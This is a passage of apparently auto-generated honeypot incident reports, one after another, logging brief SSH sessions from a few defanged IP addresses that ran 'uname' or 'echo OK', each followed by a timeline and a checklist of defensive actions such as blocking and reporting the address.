| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:27:57` | `cowrie.session.connect` |
| `2026-06-25 18:27:57` | `cowrie.client.version` |
| `2026-06-25 18:27:57` | `cowrie.client.kex` |
| `2026-06-25 18:27:57` | `cowrie.login.success` |
| `2026-06-25 18:27:58` | `cowrie.session.params` |
| `2026-06-25 18:27:58` | `cowrie.command.input` |
| `2026-06-25 18:27:58` | `cowrie.log.closed` |
| `2026-06-25 18:27:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a34b7730e7fa

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:28 |
| **Last Seen** | 2026-06-25 18:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:28:44` | `cowrie.session.connect` |
| `2026-06-25 18:28:44` | `cowrie.client.version` |
| `2026-06-25 18:28:44` | `cowrie.client.kex` |
| `2026-06-25 18:28:45` | `cowrie.login.success` |
| `2026-06-25 18:28:45` | `cowrie.session.params` |
| `2026-06-25 18:28:45` | `cowrie.command.input` |
| `2026-06-25 18:28:46` | `cowrie.log.closed` |
| `2026-06-25 18:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f969959b4052

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:29 |
| **Last Seen** | 2026-06-25 18:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:29:32` | `cowrie.session.connect` |
| `2026-06-25 18:29:32` | `cowrie.client.version` |
| `2026-06-25 18:29:32` | `cowrie.client.kex` |
| `2026-06-25 18:29:32` | `cowrie.login.success` |
| `2026-06-25 18:29:33` | `cowrie.session.params` |
| `2026-06-25 18:29:33` | `cowrie.command.input` |
| `2026-06-25 18:29:33` | `cowrie.log.closed` |
| `2026-06-25 18:29:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e03bdf7563ec

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:30 |
| **Last Seen** | 2026-06-25 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:30:17` | `cowrie.session.connect` |
| `2026-06-25 18:30:17` | `cowrie.client.version` |
| `2026-06-25 18:30:17` | `cowrie.client.kex` |
| `2026-06-25 18:30:18` | `cowrie.login.success` |
| `2026-06-25 18:30:18` | `cowrie.session.params` |
| `2026-06-25 18:30:18` | `cowrie.command.input` |
| `2026-06-25 18:30:19` | `cowrie.log.closed` |
| `2026-06-25 18:30:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2451319b26cb

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:31 |
| **Last Seen** | 2026-06-25 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:31:05` | `cowrie.session.connect` |
| `2026-06-25 18:31:05` | `cowrie.client.version` |
| `2026-06-25 18:31:05` | `cowrie.client.kex` |
| `2026-06-25 18:31:05` | `cowrie.login.success` |
| `2026-06-25 18:31:06` | `cowrie.session.params` |
| `2026-06-25 18:31:06` | `cowrie.command.input` |
| `2026-06-25 18:31:06` | `cowrie.log.closed` |
| `2026-06-25 18:31:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc1ca934bc14

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:31 |
| **Last Seen** | 2026-06-25 18:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:31:56` | `cowrie.session.connect` |
| `2026-06-25 18:31:56` | `cowrie.client.version` |
| `2026-06-25 18:31:56` | `cowrie.client.kex` |
| `2026-06-25 18:31:56` | `cowrie.login.success` |
| `2026-06-25 18:31:57` | `cowrie.session.params` |
| `2026-06-25 18:31:57` | `cowrie.command.input` |
| `2026-06-25 18:31:57` | `cowrie.log.closed` |
| `2026-06-25 18:31:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc201430970

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 18:32 |
| **Last Seen** | 2026-06-25 18:32 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:32:41` | `cowrie.session.connect` |
| `2026-06-25 18:32:43` | `cowrie.client.version` |
| `2026-06-25 18:32:43` | `cowrie.client.kex` |
| `2026-06-25 18:32:48` | `cowrie.login.success` |
| `2026-06-25 18:32:52` | `cowrie.session.params` |
| `2026-06-25 18:32:52` | `cowrie.command.input` |
| `2026-06-25 18:32:54` | `cowrie.log.closed` |
| `2026-06-25 18:32:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85a9f33b8f7b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:32 |
| **Last Seen** | 2026-06-25 18:32 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:32:42` | `cowrie.session.connect` |
| `2026-06-25 18:32:42` | `cowrie.client.version` |
| `2026-06-25 18:32:42` | `cowrie.client.kex` |
| `2026-06-25 18:32:43` | `cowrie.login.success` |
| `2026-06-25 18:32:43` | `cowrie.session.params` |
| `2026-06-25 18:32:43` | `cowrie.command.input` |
| `2026-06-25 18:32:43` | `cowrie.log.closed` |
| `2026-06-25 18:32:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cb96d7a072e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:33 |
| **Last Seen** | 2026-06-25 18:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:33:29` | `cowrie.session.connect` |
| `2026-06-25 18:33:29` | `cowrie.client.version` |
| `2026-06-25 18:33:29` | `cowrie.client.kex` |
| `2026-06-25 18:33:29` | `cowrie.login.success` |
| `2026-06-25 18:33:30` | `cowrie.session.params` |
| `2026-06-25 18:33:30` | `cowrie.command.input` |
| `2026-06-25 18:33:30` | `cowrie.log.closed` |
| `2026-06-25 18:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09462b1ddea4

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:34 |
| **Last Seen** | 2026-06-25 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:34:17` | `cowrie.session.connect` |
| `2026-06-25 18:34:17` | `cowrie.client.version` |
| `2026-06-25 18:34:17` | `cowrie.client.kex` |
| `2026-06-25 18:34:17` | `cowrie.login.success` |
| `2026-06-25 18:34:18` | `cowrie.session.params` |
| `2026-06-25 18:34:18` | `cowrie.command.input` |
| `2026-06-25 18:34:18` | `cowrie.log.closed` |
| `2026-06-25 18:34:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74a46cc6163e

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:35 |
| **Last Seen** | 2026-06-25 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:35:04` | `cowrie.session.connect` |
| `2026-06-25 18:35:04` | `cowrie.client.version` |
| `2026-06-25 18:35:04` | `cowrie.client.kex` |
| `2026-06-25 18:35:05` | `cowrie.login.success` |
| `2026-06-25 18:35:05` | `cowrie.session.params` |
| `2026-06-25 18:35:05` | `cowrie.command.input` |
| `2026-06-25 18:35:06` | `cowrie.log.closed` |
| `2026-06-25 18:35:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1579203effd

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 18:35 |
| **Last Seen** | 2026-06-25 18:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:35:41` | `cowrie.session.connect` |
| `2026-06-25 18:35:41` | `cowrie.client.version` |
| `2026-06-25 18:35:41` | `cowrie.client.kex` |
| `2026-06-25 18:35:44` | `cowrie.login.success` |
| `2026-06-25 18:35:45` | `cowrie.session.params` |
| `2026-06-25 18:35:45` | `cowrie.command.input` |
| `2026-06-25 18:35:46` | `cowrie.log.closed` |
| `2026-06-25 18:35:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc8090f0dcfd

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:35 |
| **Last Seen** | 2026-06-25 18:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:35:52` | `cowrie.session.connect` |
| `2026-06-25 18:35:52` | `cowrie.client.version` |
| `2026-06-25 18:35:52` | `cowrie.client.kex` |
| `2026-06-25 18:35:52` | `cowrie.login.success` |
| `2026-06-25 18:35:53` | `cowrie.session.params` |
| `2026-06-25 18:35:53` | `cowrie.command.input` |
| `2026-06-25 18:35:53` | `cowrie.log.closed` |
| `2026-06-25 18:35:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1954a1e682c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:36 |
| **Last Seen** | 2026-06-25 18:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:36:39` | `cowrie.session.connect` |
| `2026-06-25 18:36:39` | `cowrie.client.version` |
| `2026-06-25 18:36:39` | `cowrie.client.kex` |
| `2026-06-25 18:36:39` | `cowrie.login.success` |
| `2026-06-25 18:36:40` | `cowrie.session.params` |
| `2026-06-25 18:36:40` | `cowrie.command.input` |
| `2026-06-25 18:36:40` | `cowrie.log.closed` |
| `2026-06-25 18:36:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6fd14e4bf68

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:37 |
| **Last Seen** | 2026-06-25 18:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:37:25` | `cowrie.session.connect` |
| `2026-06-25 18:37:25` | `cowrie.client.version` |
| `2026-06-25 18:37:25` | `cowrie.client.kex` |
| `2026-06-25 18:37:26` | `cowrie.login.success` |
| `2026-06-25 18:37:26` | `cowrie.session.params` |
| `2026-06-25 18:37:26` | `cowrie.command.input` |
| `2026-06-25 18:37:27` | `cowrie.log.closed` |
| `2026-06-25 18:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5bc288cfe6a8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:38 |
| **Last Seen** | 2026-06-25 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:38:11` | `cowrie.session.connect` |
| `2026-06-25 18:38:11` | `cowrie.client.version` |
| `2026-06-25 18:38:11` | `cowrie.client.kex` |
| `2026-06-25 18:38:11` | `cowrie.login.success` |
| `2026-06-25 18:38:12` | `cowrie.session.params` |
| `2026-06-25 18:38:12` | `cowrie.command.input` |
| `2026-06-25 18:38:12` | `cowrie.log.closed` |
| `2026-06-25 18:38:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-163454f71cc1

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:38 |
| **Last Seen** | 2026-06-25 18:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:38:57` | `cowrie.session.connect` |
| `2026-06-25 18:38:57` | `cowrie.client.version` |
| `2026-06-25 18:38:57` | `cowrie.client.kex` |
| `2026-06-25 18:38:57` | `cowrie.login.success` |
| `2026-06-25 18:38:58` | `cowrie.session.params` |
| `2026-06-25 18:38:58` | `cowrie.command.input` |
| `2026-06-25 18:38:58` | `cowrie.log.closed` |
| `2026-06-25 18:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-559761a13a78

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:39 |
| **Last Seen** | 2026-06-25 18:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:39:44` | `cowrie.session.connect` |
| `2026-06-25 18:39:44` | `cowrie.client.version` |
| `2026-06-25 18:39:44` | `cowrie.client.kex` |
| `2026-06-25 18:39:44` | `cowrie.login.success` |
| `2026-06-25 18:39:45` | `cowrie.session.params` |
| `2026-06-25 18:39:45` | `cowrie.command.input` |
| `2026-06-25 18:39:45` | `cowrie.log.closed` |
| `2026-06-25 18:39:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0091a08de8b6

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:40 |
| **Last Seen** | 2026-06-25 18:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:40:32` | `cowrie.session.connect` |
| `2026-06-25 18:40:32` | `cowrie.client.version` |
| `2026-06-25 18:40:32` | `cowrie.client.kex` |
| `2026-06-25 18:40:33` | `cowrie.login.success` |
| `2026-06-25 18:40:34` | `cowrie.session.params` |
| `2026-06-25 18:40:34` | `cowrie.command.input` |
| `2026-06-25 18:40:34` | `cowrie.log.closed` |
| `2026-06-25 18:40:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7096ffde5c27

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:41 |
| **Last Seen** | 2026-06-25 18:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:41:22` | `cowrie.session.connect` |
| `2026-06-25 18:41:22` | `cowrie.client.version` |
| `2026-06-25 18:41:22` | `cowrie.client.kex` |
| `2026-06-25 18:41:22` | `cowrie.login.success` |
| `2026-06-25 18:41:23` | `cowrie.session.params` |
| `2026-06-25 18:41:23` | `cowrie.command.input` |
| `2026-06-25 18:41:23` | `cowrie.log.closed` |
| `2026-06-25 18:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90d02e36011a

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:42 |
| **Last Seen** | 2026-06-25 18:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:42:11` | `cowrie.session.connect` |
| `2026-06-25 18:42:11` | `cowrie.client.version` |
| `2026-06-25 18:42:11` | `cowrie.client.kex` |
| `2026-06-25 18:42:11` | `cowrie.login.success` |
| `2026-06-25 18:42:12` | `cowrie.session.params` |
| `2026-06-25 18:42:12` | `cowrie.command.input` |
| `2026-06-25 18:42:12` | `cowrie.log.closed` |
| `2026-06-25 18:42:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04af2b541dd8

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:42 |
| **Last Seen** | 2026-06-25 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:42:59` | `cowrie.session.connect` |
| `2026-06-25 18:42:59` | `cowrie.client.version` |
| `2026-06-25 18:42:59` | `cowrie.client.kex` |
| `2026-06-25 18:42:59` | `cowrie.login.success` |
| `2026-06-25 18:43:00` | `cowrie.session.params` |
| `2026-06-25 18:43:00` | `cowrie.command.input` |
| `2026-06-25 18:43:00` | `cowrie.log.closed` |
| `2026-06-25 18:43:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e9991229f8b

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:43 |
| **Last Seen** | 2026-06-25 18:43 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:43:47` | `cowrie.session.connect` |
| `2026-06-25 18:43:47` | `cowrie.client.version` |
| `2026-06-25 18:43:47` | `cowrie.client.kex` |
| `2026-06-25 18:43:47` | `cowrie.login.success` |
| `2026-06-25 18:43:48` | `cowrie.session.params` |
| `2026-06-25 18:43:48` | `cowrie.command.input` |
| `2026-06-25 18:43:48` | `cowrie.log.closed` |
| `2026-06-25 18:43:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d295cec0c564

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-25 18:44 |
| **Last Seen** | 2026-06-25 18:44 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:44:11` | `cowrie.session.connect` |
| `2026-06-25 18:44:13` | `cowrie.client.version` |
| `2026-06-25 18:44:13` | `cowrie.client.kex` |
| `2026-06-25 18:44:18` | `cowrie.login.success` |
| `2026-06-25 18:44:22` | `cowrie.session.params` |
| `2026-06-25 18:44:22` | `cowrie.command.input` |
| `2026-06-25 18:44:23` | `cowrie.log.closed` |
| `2026-06-25 18:44:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeb9b19c2d60

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:44 |
| **Last Seen** | 2026-06-25 18:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:44:37` | `cowrie.session.connect` |
| `2026-06-25 18:44:37` | `cowrie.client.version` |
| `2026-06-25 18:44:37` | `cowrie.client.kex` |
| `2026-06-25 18:44:37` | `cowrie.login.success` |
| `2026-06-25 18:44:38` | `cowrie.session.params` |
| `2026-06-25 18:44:38` | `cowrie.command.input` |
| `2026-06-25 18:44:38` | `cowrie.log.closed` |
| `2026-06-25 18:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d4217e149a91

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 18:45 |
| **Last Seen** | 2026-06-25 18:45 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 18:45:31` | `cowrie.session.connect` |
| `2026-06-25 18:45:31` | `cowrie.client.version` |
| `2026-06-25 18:45:31` | `cowrie.client.kex` |
| `2026-06-25 18:45:31` | `cowrie.login.success` |
| `2026-06-25 18:45:32` | `cowrie.session.params` |
| `2026-06-25 18:45:32` | `cowrie.command.input` |
| `2026-06-25 18:45:32` | `cowrie.log.closed` |
| `2026-06-25 18:45:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
